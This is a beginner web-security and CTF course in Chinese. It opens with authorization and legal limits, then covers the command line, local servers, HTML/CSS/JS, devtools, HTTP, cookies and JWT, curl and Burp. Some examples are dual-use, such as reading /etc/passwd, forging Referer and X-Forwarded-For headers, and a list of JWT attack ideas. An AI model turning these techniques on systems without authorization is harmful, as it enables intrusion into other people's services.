## 授权与法律边界

*约 20 分钟*

> 🎯 **本节目标**：能清晰判断：我这个测试行为，合不合法。

> 💡 无授权，不测试；有授权，不越界。

这一节不是走过场。学习安全技术最容易出事的地方，就是把「练习」做成「入侵」。

- 只测试自己拥有、或拿到明确书面授权的系统。
- 使用公开靶场前，先读并遵守平台规则。
- 不要扫描或攻击学校、企业、政府机构的网站。
- 不要因为「只是试一下」就向陌生站点发送攻击请求。
- 不要获取、保存、传播他人的隐私和业务数据。
- 发现真实漏洞，通过正规漏洞响应渠道报告，不要自行深入。

唯一安全的练习环境只有这五种：

- 自己控制的虚拟机或服务器
- 本地 Docker 容器
- 自己编写的测试程序
- 比赛提供的题目环境
- 明确允许安全测试的公开靶场（CTFHub、BUUCTF、NSSCTF、DVWA 等）

真实的渗透测试必须建立在授权之上，并且有明确范围、时间、禁止项。它和 CTF 的最大区别是：CTF 追求拿 flag，真实测试追求「发现并帮助修复风险」，且绝不能影响业务。

## 提问六要素与如何用 AI

*约 25 分钟*

> 🎯 **本节目标**：把「这题怎么做」升级成能被秒答的问题，并知道 AI 该用在哪、不该用在哪。

零基础阶段最大的效率瓶颈不是智力，是提问质量。同一个问题，问得好 5 分钟解决，问得差三天没人理。

高质量问题包含六要素：

- **目标**：我正在做什么？
- **环境**：操作系统、PHP/Python 版本、工具版本
- **预期**：我以为会发生什么？
- **实际**：实际发生了什么？（完整报错，不要只截一行）
- **已试**：我试过哪些方法？
- **卡点**：我具体不理解哪一步？

**反例 → 正例**

```
<反例>
师傅这题怎么做？我怎么什么都不会

<正例>
我判断这题可能是 SQL 注入，因为输入单引号后页面返回了数据库报错。
我已用 order by 判断字段数为 3，并用 Burp 重放了请求。
问题是：两次响应长度完全一致，我不知道该比较响应长度还是响应时间。
附件：原始请求、两次响应、我试过的 payload。
```

搜索也一样。搜完整报错，不要搜情绪描述：

**搜索方式对比**

```
✗  PHP 报错怎么办？？？
✓  "Warning: Undefined array key" PHP POST
✓  flask jinja2 TemplateNotFound 报错
```

关于 AI：它可以帮你解释概念、读报错、分析代码执行流程、写示例、整理笔记。但**不要把整道题丢给它一把梭**——这个阶段解出题不是目的，学到东西才是。AI 还会一本正经地胡说八道，关键结论必须查官方文档并在本地验证。

> 💡 向 AI 提问时，附上：代码、HTTP 请求与响应、报错原文、你已经试过什么、你具体卡在哪一句。给的信息越像「现场」，回答越准。

## 终端、Shell、命令行：三个词到底是什么

*约 15 分钟*

> 🎯 **本节目标**：说清「终端 / Shell / 命令行 / 脚本」的区别，不再被这几个词绕晕。

先拆开这三个词，它们经常被混着用，但指的是不同的东西：

**三个概念**

| 词 | 是什么 | 例子 |
| --- | --- | --- |
| 终端（Terminal） | 一个窗口，负责显示文字、接收你敲的键 | Windows Terminal、VS Code 的终端、Ubuntu 的 Terminal |
| Shell | 终端里真正干活的程序：读你的命令、去执行、把结果打印出来 | cmd.exe、PowerShell、bash、zsh |
| 命令行（CLI） | 「用文字下指令」这种交互方式本身，与图形界面相对 | 你在 Shell 里敲命令这件事 |

所以「打开命令行」= 打开一个终端 + 里面跑着一个 Shell。你在 cmd 里敲的是 cmd 的命令，在 PowerShell 里敲的是 PowerShell 的命令，在 Ubuntu 的终端里敲的是 bash 的命令——**它们长得像，但不完全一样**，这正是初学者最容易被绊倒的地方。

**同一个意思，三种写法**

```
             Windows cmd        PowerShell            Linux (bash)
列出文件      dir                ls / Get-ChildItem    ls
切换目录      cd 路径            cd 路径               cd 路径
看当前目录    cd                 pwd                   pwd
清屏          cls                cls                   clear
看文件内容    type 文件          cat 文件 / Get-Content cat 文件
新建文件夹    mkdir 名字         mkdir 名字            mkdir 名字
删除文件      del 文件           rm 文件               rm 文件
查帮助        help 命令           Get-Help 命令         man 命令
```

> 💡 本课程后面的命令默认写在 **Ubuntu / bash** 里（因为 CTF 靶场、题目环境基本都是 Linux）。你自己的 Windows 上也能用，但要知道哪些命令要换写法——下一节专门讲。

## 你这台 Windows 上的三个命令行环境

*约 20 分钟*

> 🎯 **本节目标**：分清 cmd、PowerShell、WSL 的关系，知道每件事该在哪个环境里做。

**三个环境对照**

| 环境 | 怎么打开 | 特点 | 适合做什么 |
| --- | --- | --- | --- |
| cmd（命令提示符） | Win+R → 输入 cmd → 回车 | 最老、最简单，命令少 | 临时跑个 exe、ping 一下、看版本 |
| PowerShell | Win+X → 终端 / 搜索 PowerShell | 功能强，能写脚本，命令是动词-名词式 | Windows 上的文件批量操作、查进程、装工具 |
| WSL（Ubuntu） | 开始菜单搜 Ubuntu / 在终端输入 wsl | 真正的 Linux 内核，和服务器几乎一样 | 跑靶场、装 python/php/nginx、练 Linux 命令 |

### 先分清「你在哪」

1. 打开后看提示符：`C:\Users\你&gt;` 是 cmd 或 PowerShell；`你@主机:~$` 是 WSL 的 bash。
2. 在 PowerShell 里敲 `wsl` 回车就会进入 Ubuntu；在 Ubuntu 里敲 `exit` 回到 Windows。
3. 在任意环境里敲 `pwd` 看当前目录：bash 认识，cmd 不认识（cmd 用 `cd` 看当前目录）。
4. 不确定某个命令属于谁？先敲 `help` 或 `xxx --help`，能出来就是当前环境支持。

**一个容易踩的坑：路径写法**

```
Windows 路径：  C:\Users\WEIHAO\Desktop\wei_web
Linux 路径：    /home/weihao/wei_web

WSL 访问 Windows 文件：/mnt/c/Users/WEIHAO/Desktop/wei_web
Windows 访问 WSL 文件：\\wsl$\Ubuntu\home\weihao

结论：同一个文件，两边路径写法完全不同。搞不清就用 pwd 看一眼。
```

> 💡 Windows + WSL 其实是最好的组合：**Windows 上写的东西放到 Ubuntu 里跑，Ubuntu 里的文件随时能用 Windows 的编辑器打开**。不用装虚拟机也不用折腾双系统。

## 20 个必会命令（够你用一整年）

*约 30 分钟*

> 🎯 **本节目标**：把这 20 个命令练到不用查，能独立在目录里走动、看文件、跑服务。

命令不用背全，先把下面 20 个练熟。你在 Ubuntu 里敲（Windows 的 cmd 里有些名字不一样，对照着看）。

**目录与文件（最常用）**

| 命令 | 作用 | 例子 |
| --- | --- | --- |
| pwd | 我在哪（打印当前目录） | pwd |
| ls -la | 看这个目录有什么（含隐藏文件） | ls -la |
| cd 目录 | 进入目录；cd .. 返回上一级；cd ~ 回家目录 | cd /var/www |
| mkdir -p 目录 | 新建目录（-p 连父目录一起建） | mkdir -p web/test |
| touch 文件 | 新建空文件 / 更新时间戳 | touch a.txt |
| cp -r 源 目标 | 复制文件或目录 | cp -r src/ backup/ |
| mv 源 目标 | 移动 / 重命名 | mv a.txt b.txt |
| rm -rf 目录 | 删除（很危险，-rf 是递归强制，别乱用） | rm -rf old/ |
| cat 文件 | 把文件内容打印出来 | cat /etc/passwd |
| less 文件 | 分页看长文件（q 退出） | less access.log |

**查找、网络、运行**

| 命令 | 作用 | 例子 |
| --- | --- | --- |
| grep 关键字 文件 | 在文件里搜字符串 | grep flag access.log |
| find 目录 -name 模式 | 按名字找文件 | find / -name "flag*" |
| chmod +x 文件 | 给执行权限 | chmod +x run.sh |
| ps aux | 看所有进程 | ps aux \| grep python |
| kill 进程号 | 结束进程 | kill 1234 |
| curl 网址 | 发 HTTP 请求（最常用） | curl -i http://127.0.0.1:8000/ |
| ping 地址 | 测连通性 | ping -c 3 baidu.com |
| sudo 命令 | 用管理员权限执行 | sudo apt update |
| apt install 包 | 安装软件 | sudo apt install nginx |
| history | 看之前敲过什么 | history \| tail -20 |

**几个马上就用的组合**

```bash
# 看某个端口有没有被占用
ss -tlnp | grep 8000

# 把命令输出写到文件（> 覆盖，>> 追加）
ls -la > list.txt

# 管道：把前一个命令的输出交给后一个
ps aux | grep nginx

# 后台运行一个服务，日志写到文件
python3 -m http.server 8000 > server.log 2>&1 &

# 结束它
kill %1
```

## 跑起你的第一个本地 Web 服务

*约 25 分钟*

> 🎯 **本节目标**：用三条命令分别起一个静态站、一个 PHP 站、一个 Flask 站，并知道端口是什么。

本地起服务是你以后每天都要做的事：靶场在本地跑、自己的漏洞代码在本地跑、调试在本地跑。不用装复杂的东西，三条命令足够。

**① 静态文件服务（最简单，任意目录可用）**

```bash
# 在任意目录里执行，就把这个目录当成网站根目录
python3 -m http.server 8000

# 然后浏览器打开 http://127.0.0.1:8000
# 本课程的单文件版就是这样预览：
cd /mnt/c/Users/WEIHAO/Desktop/wei_web/dist && python3 -m http.server 8899
# 打开 http://127.0.0.1:8899/wei_web.html
```

**② PHP 内置服务（练 PHP 特性时用）**

```bash
cd ~/ctf
echo '<?php echo "hello " . $_GET["name"]; ?>' > index.php
php -S 127.0.0.1:8001

# 浏览器打开 http://127.0.0.1:8001/?name=web
```

**③ Flask（PART 5 会详细学）**

```python
# pip install flask
from flask import Flask, request

app = Flask(__name__)

@app.route("/")
def index():
    name = request.args.get("name", "web")
    return f"<h1>Hello, {name}</h1>"

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=8002)
```

**端口与访问地址**

| 概念 | 说明 |
| --- | --- |
| 127.0.0.1 | 本机地址（localhost 和它等价） |
| 端口 8000/8001/8002 | 同一台机器上区分不同服务；一个端口只能被一个程序占用 |
| http://127.0.0.1:8000 | 完整访问地址：协议 + 地址 + 端口 |
| 服务没起来？ | 看终端报错；换一个端口；确认端口没被占用（ss -tlnp） |

> 💡 一个小习惯：**每起一个服务就在终端占一个窗口，别关掉**；要停就 Ctrl+C。把这些启动命令记进 p0b3 的笔记里，以后直接复制。

## HTML：网页的骨架

*约 25 分钟*

> 🎯 **本节目标**：看懂任意网页的 HTML 结构，分清「给人看的」和「给浏览器看的」。

HTML 用「标签」描述页面有什么内容。浏览器读到标签，才知道哪里是标题、哪里是图片、哪里是链接。

**最小网页结构**

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>我的第一个网页</title>
    <link rel="stylesheet" href="style.css">
  </head>
  <body>
    <h1>你好，Web</h1>
    <p>这是一段文字。</p>
    <a href="https://example.com">一个链接</a>
    <img src="cat.png" alt="一只猫">
    <!-- 注释：浏览器不会显示这一行 -->
  </body>
</html>
```

- **&lt;head&gt;**：给浏览器看的信息。标题、字符集、外部样式、脚本、meta 信息。不直接显示在页面上。
- **&lt;body&gt;**：给人看的内容。
- 常见标签：**h1-h6** 标题、**p** 段落、**a** 链接、**img** 图片、**div** 区块、**form/input** 表单。
- **属性**：name="value" 给标签补充信息，例如 href、src、class、id、type。
- **&lt;!-- --&gt;**：注释。页面上看不到，但源码里完整存在。

> 💡 CTF 里大量「藏在页面里」的 flag，就藏在注释、隐藏表单字段、display:none 的元素、或者 data-* 自定义属性里。记住：能发到浏览器的，就不算秘密。

动手：在桌面新建 hello.html，粘进上面的代码，双击用浏览器打开，然后按 F12 看 Elements 面板。

## CSS：样式，以及「被藏起来的东西」

*约 25 分钟*

> 🎯 **本节目标**：知道 CSS 能隐藏内容，并能在 Elements 面板里把隐藏的东西「扒出来」。

CSS 决定页面长什么样。选择器选中元素，声明块决定属性。

**三种常见的「隐藏」**

```css
/* 1. 完全不占位，元素还在 DOM 里 */
.hidden { display: none; }

/* 2. 占位但看不见 */
.invisible { visibility: hidden; }

/* 3. 透明 / 移出屏幕外 —— 内容仍然可选中、可读 */
.ghost {
  opacity: 0;
  position: absolute;
  left: -9999px;
}
```

这三种方式都只是「视觉隐藏」。DOM 里内容原样存在，F12 一看就露。

实操：在 Elements 面板选中元素，右侧 Styles 里把 **display: none** 取消勾选，元素立刻出现。这是 CTF 里最基本的一招。

**练习用页面**

```html
<div style="display:none">你找到我了</div>
<div style="opacity:0">我也在</div>
<input type="hidden" name="token" value="secret-token">
```

> 💡 注意最后那个 &lt;input type="hidden"&gt;：它不是 CSS 隐藏，而是表单字段本身就不显示。它的 value 会随表单一起提交——这是「前端泄露」的经典位置。

## JavaScript：从看懂到能改页面

*约 35 分钟*

> 🎯 **本节目标**：读懂基本 JS 代码，并能在控制台里改页面内容、发一个请求。

JavaScript 让页面「动起来」：响应点击、发请求、改内容。它是 Web 方向第一门必须掌握的语言。

**最小语法集**

```js
// 变量
var a = 1;            // 老写法，函数作用域
let b = "text";       // 块级作用域
const c = true;       // 常量，不可重新赋值

// 对象与数组
const user = { name: "wei", age: 18, tags: ["web", "ctf"] };
console.log(user.name);      // wei
console.log(user.tags[0]);   // web

// 函数
function add(x, y) { return x + y; }
const mul = (x, y) => x * y;  // 箭头函数，等价写法

// 条件与循环
if (user.age >= 18) { console.log("adult"); }
for (const t of user.tags) { console.log(t); }
```

**操作页面（DOM）**

```js
// 选中元素
const box = document.getElementById("box");
const first = document.querySelector("h1");
const all = document.querySelectorAll("a");   // 类数组

// 改内容与样式
box.textContent = "被改了";
box.style.background = "red";

// 读属性
console.log(box.getAttribute("data-x"));

// 绑定事件
box.onclick = () => alert("你点了我");
```

**发请求（fetch）**

```js
fetch("/api/user?id=1")
  .then(r => r.json())          // 把响应体当 JSON 解析
  .then(data => console.log(data))
  .catch(err => console.error(err));
```

> 💡 fetch 是异步的。代码写完之后不会立刻拿到结果，所以要用 .then 或 async/await。**在控制台里直接写返回值，会看到 Promise {&lt;pending&gt;} —— 这不是错，是还没回来。**

## 在控制台写代码（Console 实战）

*约 35 分钟*

> 🎯 **本节目标**：能在 Console 面板里直接执行 JS：选元素、改页面、读变量、发请求。

控制台（Console）是浏览器留给你的「任意代码执行入口」。它跑在当前页面的环境里，能用页面上所有变量和函数——这是 Web 安全和前端逆向最重要的工具之一。

打开方式：F12 → Console 面板。快捷键 Ctrl+Shift+J 可直接跳过来。

**第一步：选元素（$ 与 $$）**

```js
$("h1")            // 等价 document.querySelector("h1")
$$("a")            // 等价 querySelectorAll，返回数组
$("h1").textContent = "控制台改的"
```

**第二步：读页面上的东西**

```js
document.title           // 标题
document.cookie          // 本页可见的 Cookie
document.forms[0]        // 第一个表单
[...document.querySelectorAll("input")].map(i => i.value)  // 所有输入框的值
```

**第三步：发请求并看结果**

```js
// 同步写法：控制台支持 await（顶层 await）
const r = await fetch("/api/user?id=1");
const j = await r.json();
console.log(j);
```

**第四步：几个提高效率的技巧**

```js
$_            // 上一次表达式的结果
$0            // 在 Elements 里当前选中的元素
console.table([{a:1,b:2},{a:3,b:4}])   // 表格化输出
console.dir(obj)                       // 展开对象结构
copy(obj)                              // 把对象复制到剪贴板
monitorEvents(window, "click")         // 监控事件
```

**动手练习（就在这个页面上做）：**

- 按 F12 打开 Console，输入 **document.title**，看到当前标题。
- 输入 **document.title = "我改的"**，看浏览器标签页标题变化。
- 输入 **$("h1").textContent**，读出当前这节的标题。
- 输入 **document.cookie**，看这个页面有没有 Cookie。

> 💡 控制台里的修改只在当前页面有效，刷新就没了。这是它适合「试探」的原因——但也意味着你不能靠它改文件。

进阶：控制台是 CTF 里破解「前端校验」最直接的入口。如果一段逻辑写在 JS 里（比如密码比对、token 生成），你完全可以在控制台里调用它、改参数、绕过它。

## 开发者工具五个核心面板

*约 30 分钟*

> 🎯 **本节目标**：说清 Elements / Console / Sources / Network / Application 各查什么。

F12 打开后，顶部一排标签就是你的主战场。CTF Web 题 80% 的信息都在这里。

- **Elements / 元素**：看并临时修改 HTML 与 CSS。找隐藏内容、找注释、改样式，都在这里。
- **Console / 控制台**：执行 JS、看报错、发请求。上一节专门讲过。
- **Sources / 源代码**：看页面加载的 JS 文件、打断点、单步调试。读 app.js 就在这里。
- **Network / 网络**：看每一次 HTTP 请求——URL、方法、请求头、请求体、响应。**这是 Web 安全最核心的面板。**
- **Application / 应用**：看 Cookie、LocalStorage、SessionStorage、IndexedDB、缓存。

**Network 面板最该看的四样东西**

```
1. Request URL      —— 请求打到了哪个接口
2. Request Method   —— GET 还是 POST
3. Request Headers  —— Cookie / Authorization / Referer / User-Agent
4. Payload / Form Data —— 到底提交了什么参数

进阶：右键请求 → Copy as cURL，可以直接拿到命令行复现命令
```

实操：打开任意网站 → F12 → Network → 刷新页面 → 点开第一个请求 → 找到「请求标头」和「响应标头」。

> 💡 Network 面板默认会「清空」历史请求。勾上 Preserve log（保留日志），页面跳转时请求记录才不会丢——登录流程、重定向类题目必须开这个。

## 读源代码：从 F12 到读懂 app.js

*约 40 分钟*

> 🎯 **本节目标**：能在 Sources 面板里定位并读懂一个 JS 文件，从中找出关键变量或 flag。

前面都是「看页面」。这一节是「看代码」。Web 题里真正值钱的信息，往往在被压缩过、看不下去的 JS 文件里。

**第一步：找到文件。**F12 → Sources 面板 → 左侧 Page 折叠出站点域名 → 展开可以看到所有加载的 js / css / 图片。

**第二步：全局搜索。**按 Ctrl+Shift+F（不是 Ctrl+F），可以在**所有文件**里搜索字符串。找 flag、找 api、找 password、找 key，这是最快的一招。

**第三步：美化压缩代码。**压缩过的代码是一整行。点 Sources 面板左下角的 **{ }** 按钮（Pretty print），它会自动换行缩进。

**压缩代码长什么样，为什么要看懂它**

```js
// 压缩后的样子（一行到底，变量名全被改成 _0x 开头）
!function(){var _0x3f8a=["r3ad_th3_s0urc3"],_0x1a2b="flag{";
window.__demo={version:"1.0",key:function(){return _0x1a2b+_0x3f8a[0]+"}"}};}();

// 美化 + 加换行后，逻辑就出来了：
// 1) 定义字符串数组 _0x3f8a
// 2) 定义前缀 _0x1a2b = "flag{"
// 3) 挂一个全局对象 window.__demo，其中 key() 返回 前缀 + 数组第 0 项 + "}"
```

压缩代码的三个阅读要诀：

- **先找字符串数组**：压缩工具通常把所有字符串集中到一个数组里（如 _0x3f8a），再通过下标取用。
- **再找全局挂载**：window.xxx、globalThis.xxx —— 这些是外部能访问到的出口，也是题目留给你的突破口。
- **最后看关键函数**：加密、校验、生成 token 的函数，就是你要绕过的对象。

**第四步（核心技巧）：直接执行它。**如果能读到代码，就不一定要读懂——很多情况下你可以在控制台里直接调用那个函数拿到结果。

**读不懂就调用**

```js
// 上面那段代码挂了 window.__demo，于是在控制台里：
__demo.key()          // 直接把结果算出来
// 输出：flag{r3ad_th3_s0urc3}
```

> 💡 这是 Web 安全里极其重要的思维：**只要代码在客户端，它就是可读、可改、可调用的。**「前端加密」在有代码的情况下等于没有加密。

## HTTP 请求与响应结构

*约 30 分钟*

> 🎯 **本节目标**：能逐行拆解一个原始 HTTP 请求和响应。

HTTP 是「一问一答」的文本协议。读懂它，是后面所有漏洞的前提。

**请求的四部分**

```http
POST /login HTTP/1.1          ← 请求行：方法 + 路径 + 版本
Host: example.com             ← 请求头开始
User-Agent: Mozilla/5.0
Content-Type: application/json
Cookie: session=abc123
Content-Length: 27
                              ← 空行（必须）
{"user":"admin","pw":"123"}   ← 请求体
```

**响应的四部分**

```http
HTTP/1.1 200 OK               ← 状态行
Content-Type: text/html; charset=utf-8
Set-Cookie: session=abc123; HttpOnly
Content-Length: 26
                              ← 空行
<h1>Hello, Web!</h1>          ← 响应体
```

- **请求行**：方法、路径（含查询串 ?a=1&b=2）、协议版本。
- **请求头**：Host、Cookie、User-Agent、Referer、Content-Type 等。
- **请求体**：GET 一般没有；POST/PUT 携带数据。
- **响应头**：Content-Type、Set-Cookie、Location（重定向）、Server。

> 💡 CTF 里「改请求」改的通常是这几处：路径参数、请求头（Cookie/Referer/X-Forwarded-For/User-Agent）、请求体。90% 的 Web 题都是在这三个位置做文章。

## 请求方法与状态码

*约 25 分钟*

> 🎯 **本节目标**：能根据方法和状态码判断发生了什么，并知道哪些状态码在 CTF 里是「有戏」的信号。

- **GET** 取数据，参数在 URL；**POST** 提交数据，参数在请求体；**PUT** 更新；**DELETE** 删除；**HEAD** 只要响应头；**OPTIONS** 查支持的方法（CORS 预检会用到）。

- **200** 成功｜**301/302** 重定向｜**304** 缓存未改
- **400** 请求格式错误｜**401** 未认证｜**403** 拒绝访问｜**404** 不存在｜**405** 方法不允许
- **500** 服务器内部错误｜**502/503/504** 网关/服务不可用

CTF 里的状态码信号：

- 本该 403 的页面返回 200 → 可能绕过了权限校验。
- 同样的请求，改一个参数后响应长度变了 → 存在注入或条件判断（盲注的核心）。
- 500 且报错里带 SQL 语法 → 注入点暴露。
- 302 跳到 /admin → 可能已经拿到管理员会话。

> 💡 别只看状态码。**响应长度、响应时间、响应内容差异**，往往比状态码更能说明问题。

## Cookie、Session、Token

*约 35 分钟*

> 🎯 **本节目标**：讲清「登录状态」的三代实现方式，以及各自的攻击面。

HTTP 是无状态的：服务器默认不记得你上次来过。为了让「登录一次，之后都认识你」，诞生了三种方案。

**① Cookie + Session（服务端存状态）**

```http
响应：Set-Cookie: session=8f3a...; HttpOnly; Path=/
请求：Cookie: session=8f3a...

服务端：session 表里 8f3a -> {uid: 1, role: "user"}
特点：浏览器只拿到一个随机 ID，真实数据在服务器
```

**② JWT（信息存在 token 里）**

```js
// JWT 由三段组成：header.payload.signature
// payload 是 base64url，任何人都能解开看
{
  "alg": "HS256",
  "typ": "JWT"
}
.
{ "uid": 1, "role": "user" }
.
<用密钥算出的签名>
```

JWT 的关键认知：**payload 是明文可读的（只是 base64），安全性完全依赖签名。**所以攻击面很明确——篡改 payload 后能否让签名校验通过。

- **Cookie 相关攻击面**：session id 可预测、未设 HttpOnly 被 XSS 偷走、SameSite 缺失导致 CSRF。
- **JWT 相关攻击面**：alg 改成 none、弱密钥可爆破、公钥当私钥用（算法混淆）、kid 注入。
- **前端存储 token 的风险**：放 localStorage 会被 XSS 读走。

实操：F12 → Application → Cookies / LocalStorage，看这个站存了什么。

## 用 curl 手动发请求

*约 30 分钟*

> 🎯 **本节目标**：脱离浏览器，用命令行精确控制每一个请求头。

浏览器会「帮你补全」很多头，这反而让你看不清到底发了什么。curl 让你完全掌控。

**常用姿势**

```bash
# 最基础
curl https://example.com/

# 只看响应头
curl -I https://example.com/

# 跟随重定向，并显示过程
curl -L -v https://example.com/

# 发 POST 表单
curl -X POST -d "username=admin&password=123" https://example.com/login

# 发 JSON
curl -X POST -H "Content-Type: application/json" \
     -d '{"user":"admin"}' https://example.com/api

# 带上 Cookie
curl -b "session=abc123" https://example.com/profile

# 自定义任意头（伪造 Referer / XFF）
curl -H "Referer: https://admin.example.com" \
     -H "X-Forwarded-For: 127.0.0.1" https://example.com/
```

> 💡 浏览器 Network 面板里右键请求 → **Copy as cURL**，可以直接得到等价命令。这是从「浏览器操作」过渡到「脚本操作」最省力的桥。

## 四类组件：谁在做事，各自负责什么

*约 25 分钟*

> 🎯 **本节目标**：能说清一次请求依次穿过哪四层，每层负责什么、哪一层「说了算」。

把 Web 应用拆开看，只有四类组件。记住它们的分工，后面所有漏洞都能找到归属——**漏洞永远发生在「某一层把不可信的数据当成了可信的东西」的地方**。

**四类组件与它们的作用**

| 层 | 包含什么 | 负责什么 | 一句话 |
| --- | --- | --- | --- |
| 客户端层 | 浏览器、前端页面、JS | 呈现界面、响应用户操作、把操作组装成 HTTP 请求、保存 Cookie/Session | 负责「显示与发起」 |
| 服务端层 | 应用服务、API、框架 | 解析请求、匹配路由、认证与鉴权、执行业务逻辑、组装响应 | 负责「判断与处理」 |
| 数据层 | 数据库、缓存、文件存储 | 持久化业务数据与状态、缓存热点数据 | 负责「记住」 |
| 运行环境层 | 云 / 容器 / K8s / 网络 / 中间件 | 承载并调度上面三层、决定部署形态与网络边界 | 负责「跑起来」 |

它们之间靠 **HTTP + JSON** 通信：前端把请求发给后端，后端读写数据库，最终把结果渲染回页面。这条链路就是下一节要拆的「六段旅程」。

### 四个必须记住的推论

- **前端校验只影响体验，不影响安全。**浏览器里的一切都能被代理工具改掉——所以真正的判断必须在服务端。
- **Cookie / Token 是身份凭据**，存在客户端，因此天然是窃取目标（XSS、抓包、本机恶意软件）。
- **数据层的查询方式决定注入风险**：字符串拼接 = 高危；参数化/ORM 正确使用 = 低危。
- **运行环境决定暴露面**：端口、调试接口、管理后台、容器配置，都属于「这一层没管好」。

> 💡 一句话记住这四层：**浏览器负责「显示与发起」，服务端负责「判断与处理」，数据层负责「记住」，运行环境负责「跑起来」。**

## 一次请求的六段旅程

*约 30 分钟*

> 🎯 **本节目标**：能把一次请求拆成六段，并说出每一段「这一步发生什么」。

四层是「静态结构」，六段是「动态流程」。同一次请求，按时间顺序走完这六段，最后变成你看到的页面。

**六段旅程（总览）**

| # | 这一段 | 包含什么 | 这一步在做什么 |
| --- | --- | --- | --- |
| 1 | 客户端 | 浏览器 / 前端 | 用户操作被组装成 HTTP 请求：URL、方法、请求头、Cookie、请求体 |
| 2 | 应用入口 | 路由 / 会话 / 认证鉴权 | 匹配路由、取出会话或 Token、确认身份、判断能不能访问 |
| 3 | 业务逻辑 | 订单 / 支付 / 权限判断 | 按业务规则处理：查库存、算金额、判权限、改状态、写记录 |
| 4 | 数据访问 | SQL / ORM / 缓存 / 文件 | 读写数据库、缓存与文件，把结果返回给业务逻辑 |
| 5 | 外部依赖 | 第三方 API / 内网服务 | 调用支付、短信、对象存储、内网微服务，拼接结果继续处理 |
| 6 | 响应渲染 | 模板 / 前端 / 缓存 | 后端渲染模板或返回 JSON，前端渲染页面，缓存加速重复请求 |

1. 在浏览器里点一下按钮，按 F12 → Network，找到这次请求。
2. 看请求行与请求头：这段是「1 客户端」的产物。
3. 看响应：状态码、Set-Cookie、返回内容——这段是「2 应用入口 + 6 响应渲染」的结果。
4. 试着想：中间那三段（业务逻辑、数据访问、外部依赖）在这台服务器上发生了什么？
5. 想不出来的部分，就是你要读源码/做实验才能看见的部分——漏洞就藏在看不见的段里。

**把六段画成一条线**

```
[1 客户端] --HTTP--> [2 应用入口] --调用--> [3 业务逻辑]
                                                    |
                                                    v
                                    [4 数据访问] --查询--> [数据库/缓存/文件]
                                                    |
                                                    v
                                    [5 外部依赖] --请求--> [支付/短信/内网服务]
                                                    |
                                                    v
                                    [6 响应渲染] --HTML/JSON--> [回到浏览器]
```

> 💡 你能控制的只有第 1 段（发什么），能看到的主要是第 6 段（返回什么）。**做题的本质，就是通过「输入 → 输出」的差异，推断中间四段到底发生了什么。**

## 逐段攻击点地图：漏洞放在哪一段

*约 35 分钟*

> 🎯 **本节目标**：看到任意一个漏洞，能立刻说出它发生在六段的哪一段，并翻到本课程对应章节。

这张表是 PART 7 的索引。以后你学每一类漏洞，都应该回来把它「钉」在六段图里的某个位置——钉不住，说明你还没真正理解它。

**六段 → 攻击点 → 对应课程**

| 段 | 这一段的攻击点 | 本课程对应 |
| --- | --- | --- |
| 1 客户端 | URL 与参数可任意构造（越权遍历 ID、篡改金额）；前端校验形同虚设；XSS 偷走 Cookie/Token | p1l4 控制台 · p3l1 fetch · p5l5 XSS · p5l16 越权 |
| 2 应用入口 | 认证绕过（逻辑缺陷、弱口令、Token 可伪造）；会话固定、退出后会话仍有效；只在网关鉴权、后端接口可直连 | p2l3 Cookie/Session · p5l15 JWT · p5l16 越权 |
| 3 业务逻辑 | 只判「登录了」不判「是不是他的」；流程可跳步/重放/并发；金额数量由前端提交后端照单全收 | p5l16 逻辑漏洞与越权 |
| 4 数据访问 | 字符串拼接 SQL → 注入；反序列化/模板注入/表达式注入 → 代码执行；文件路径可控 → 路径穿越 | p5l3/p5l4 SQLi · p5l7 穿越与包含 · p5l11 SSTI · p5l13 反序列化 |
| 5 外部依赖 | 请求地址或协议可控 → SSRF；依赖组件版本落后 → 已知 CVE；第三方返回数据未校验就信任 | p5l9 SSRF · p4l2 ThinkPHP 版本 · p5l14 Java 组件 |
| 6 响应渲染 | 用户输入未编码进入 HTML → XSS；响应带出堆栈/内部 IP/数据库字段；缓存键设计不当 → 缓存投毒 | p5l5 XSS · p5l2 信息泄露 · p6l3 信息收集 |

**每一段对应的防御位置**

| 段 | 防御动作 |
| --- | --- |
| 1 客户端 | 只做体验优化；不把安全判断放前端；HttpOnly + CSP 保护凭据 |
| 2 应用入口 | 统一鉴权中间件；Token 固定算法与强密钥；退出即失效；网关与后端都校验 |
| 3 业务逻辑 | 所有关键判断在服务端；对象归属校验（user_id 必须来自 session）；关键操作用事务与幂等 |
| 4 数据访问 | 参数化查询/ORM 占位符；不反序列化外部数据；文件路径白名单 + realpath 校验 |
| 5 外部依赖 | 出站白名单代理；依赖版本管理（SCA）；对外部数据校验后再信任 |
| 6 响应渲染 | 按上下文转义；错误信息不外露；缓存键包含用户/权限维度 |

## Burp Suite 四件套

*约 45 分钟*

> 🎯 **本节目标**：会用 Proxy / HTTP history / Repeater / Decoder 完成一次完整改包，并知道每一步该看什么。

Burp 是 Web 安全最核心的工具。但初学只需要四个功能——把这四个用熟，比装一堆插件有用得多。

**四件套的分工**

| 功能 | 作用 | 什么时候用 |
| --- | --- | --- |
| Proxy 代理 | 浏览器流量经过 Burp，可拦截、修改、放行 | 需要「看」和「改」每一个请求时 |
| HTTP history 历史 | 所有经过的请求，可搜索、筛选、重放 | 回头看「刚才那个请求长什么样」 |
| Repeater 重放 | 改一个参数发一次，看响应变化 | 做题的实验台，90% 的时间在这里 |
| Decoder 编解码 | Base64 / URL / Hex / 字节互转 | 参数被编码、需要构造 payload 时 |

### 十分钟装好并跑通

1. 启动 Burp，确认 Proxy 监听 `127.0.0.1:8080`（Proxy → Options 里能看到）。
2. 浏览器装代理插件（SwitchyOmega），把 HTTP/HTTPS 都指向 `127.0.0.1:8080`。
3. 访问 `http://burp` 下载 CA 证书并安装到系统信任区——不装的话 HTTPS 全是证书错误。
4. 打开 Intercept，刷新一个页面：请求被拦下 → Forward 放行 → 关闭 Intercept。
5. 在 HTTP history 里找到刚才那条请求 → 右键 **Send to Repeater** → 改一个参数 → Send → 看响应。

**做题的标准循环（背下来）**

```
Proxy 抓到 / HTTP history 找到
        ↓
   右键 Send to Repeater
        ↓
   改一个变量（只改一个！）
        ↓
   Send → 对比：状态码 / 长度 / 关键词 / 时间
        ↓
   有变化 → 顺着改；没变化 → 换一个变量
```

**不装浏览器也能抓：curl 直接过代理**

```bash
curl -x http://127.0.0.1:8080 -k "http://target/?id=1"

# 或者直接看脚本的请求（requests 走代理）
# proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}
```

